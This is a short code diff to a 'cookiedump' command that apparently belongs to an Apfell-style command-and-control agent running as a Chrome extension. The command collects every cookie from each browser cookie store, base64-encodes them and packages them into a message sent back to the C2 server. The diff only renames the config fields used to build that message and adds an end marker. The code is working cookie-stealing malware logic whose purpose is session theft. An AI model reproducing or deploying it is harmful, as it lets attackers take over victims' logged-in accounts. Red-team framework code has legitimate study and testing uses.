@@ -6,7 +6,7 @@ cookiedump = function(params) {
             filter["storeId"] = store.id;
             chrome.cookies.getAll({"storeId": store.id}, function (cookies) {
                 const data = btoa(JSON.stringify(cookies));
-                const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+                const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, data);
                 let meta = {};
                 meta["metatype"] = 3;
                 meta["metadata"] = apfellmsg;
@@ -18,4 +18,4 @@ cookiedump = function(params) {
 };
 
 C2.commands[cookiedump.name] = cookiedump;
-
+COMMAND_ENDS_HERE
